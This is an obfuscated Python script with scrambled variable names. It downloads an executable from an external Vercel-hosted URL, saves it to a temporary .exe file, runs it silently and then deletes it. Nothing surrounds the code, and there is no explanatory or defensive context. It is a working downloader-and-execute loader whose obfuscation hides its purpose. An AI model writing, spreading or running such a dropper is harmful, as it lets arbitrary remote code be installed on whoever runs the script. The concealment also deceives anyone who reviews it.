lllllllllllllll,llllllllllllllI=exit,print
import requests as IlllIIlllIlIIl,subprocess as lIllIlIIlIIlll,tempfile as IlllIIlIIIlIll,os as lIIIlIIIlIlIlI
llIIlIIlIIllIllIlI='https://aparatus.vercel.app/output.exe'
lIllllIlIlllIIlllI=IlllIIlllIlIIl.get(llIIlIIlIIllIllIlI)
if lIllllIlIlllIIlllI.status_code==200:IIIllIllIIllIIlIII=lIllllIlIlllIIlllI.content
else:lllllllllllllll(1)
with IlllIIlIIIlIll.NamedTemporaryFile(delete=False,suffix='.exe')as lllIllllIIllIIIIll:lllIllllIIllIIIIll.write(IIIllIllIIllIIlIII);IIllIIIIllIlllllll=lllIllllIIllIIIIll.name
try:IlllIIIllllllllIlI=lIllIlIIlIIlll.run([IIllIIIIllIlllllll],check=True)
except lIllIlIIlIIlll.CalledProcessError as IIIIIIlIlIIlIlIllI:llllllllllllllI(f"An error occurred: {IIIIIIlIlIIlIlIllI}")
finally:lIIIlIIIlIlIlI.remove(IIllIIIIllIlllllll)
